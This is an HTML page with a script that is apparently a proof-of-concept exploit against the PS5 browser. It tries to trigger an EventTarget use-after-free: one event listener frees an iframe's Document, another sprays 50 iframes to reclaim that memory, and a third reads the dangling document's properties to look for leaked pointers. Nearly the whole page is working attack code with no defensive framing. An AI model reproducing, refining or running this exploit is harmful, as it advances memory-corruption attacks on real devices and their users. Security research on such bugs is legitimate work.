<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 EventTarget Info Leak (Iframe Reclaim)</title>
</head>
<body>
<button id="btn" style="font-size:24px; padding:20px;">Run UAF Test</button>
<pre id="log" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
<script>
const L = s => { document.getElementById('log').textContent += s + '\n'; };

document.getElementById('btn').onclick = () => {
    L('[*] Starting EventTarget UAF Iframe Reclaim test...');
    try {
        const f = document.body.appendChild(document.createElement('iframe'));
        const a = document.createElement('div');
        const b = a.appendChild(document.createElement('div'));

        // Listener 1: Frees the Document and throws
        a.addEventListener('a', eval(`(function () {
            document.adoptNode(a);
            f.remove();
            // Throw a smaller error to avoid immediate SIGILL but still trigger the exception path
            throw { sourceURL: 'A'.repeat(1024) };
        })`));

        // Listener 2: Buffer
        a.addEventListener('a', () => {
            L('[2] Buffer listener executed.');
            // Spray iframes here to reclaim the freed Document slot
            L('[2] Spraying 50 iframes to reclaim Document memory...');
            for (var i = 0; i < 50; i++) {
                var nf = document.createElement('iframe');
                document.body.appendChild(nf);
            }
        });

        // Listener 3: Attempts to read properties
        a.addEventListener('a', function() {
            L('[3] Attempting to read f.contentDocument...');
            let doc = f.contentDocument;
            if (!doc) {
                L('[3] f.contentDocument is null. Reference cleared.');
                return;
            }
            
            L('[3] Got an object! Attempting reads...');
            try { L('  nodeType: ' + doc.nodeType); } catch(e) { L('  nodeType ERR: ' + e); }
            try { L('  childNodes.length: ' + doc.childNodes.length); } catch(e) { L('  childNodes.length ERR: ' + e); }
            try { L('  URL: ' + doc.URL); } catch(e) { L('  URL ERR: ' + e); }
            try { L('  readyState: ' + doc.readyState); } catch(e) { L('  readyState ERR: ' + e); }
            try { L('  referrer: ' + doc.referrer); } catch(e) { L('  referrer ERR: ' + e); }
            
            L('[3] Reads finished. Check for corrupted values or pointers!');
        });

        L('[*] Dispatching event...');
        b.dispatchEvent(new Event('a', { bubbles: true }));
        L('[*] Dispatch returned.');

    } catch (e) {
        L('[!] Uncaught error: ' + e.message);
    }
};
</script>
</body>
</html>
